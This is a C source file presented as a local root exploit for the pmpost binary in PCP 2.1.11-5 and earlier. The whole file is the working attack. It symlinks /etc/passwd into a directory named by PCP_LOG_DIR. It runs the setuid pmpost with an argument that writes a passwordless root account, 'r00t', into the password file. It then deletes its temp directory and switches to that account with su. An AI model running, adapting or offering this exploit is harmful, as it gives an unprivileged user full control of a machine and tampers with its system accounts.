/********************************************************
*							*
*		pmpost local root exploit		*
*		vulnerable: pcp <= 2.1.11-5		*
*		by IhaQueR				*
*							*
********************************************************/




#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <sys/stat.h>



main()
{
const char *bin="/usr/share/pcp/bin/pmpost";
static char buf[512];
static char dir[128];


	srand(time(NULL));
	sprintf(dir, "/tmp/dupa.%.8d", rand());

	if(mkdir(dir, S_IRWXU))
		_exit(2);

	if(chdir(dir))
		_exit(3);

	if(symlink("/etc/passwd", "./NOTICES"))
		_exit(4);

	snprintf(buf, sizeof(buf)-1, "PCP_LOG_DIR=%.500s", dir);

	if(putenv(buf))
		_exit(5);

	if(!fork()) {
		execl(bin, bin, "\nr00t::0:0:root:/root:/bin/bash", NULL);
		_exit(1);
	}
	else {
		waitpid(0, NULL, WUNTRACED);
		chdir("..");
		sprintf(buf, "rm -rf dupa.*");
		system(buf);
		execl("/bin/su", "/bin/su", "r00t", NULL);
	}
}
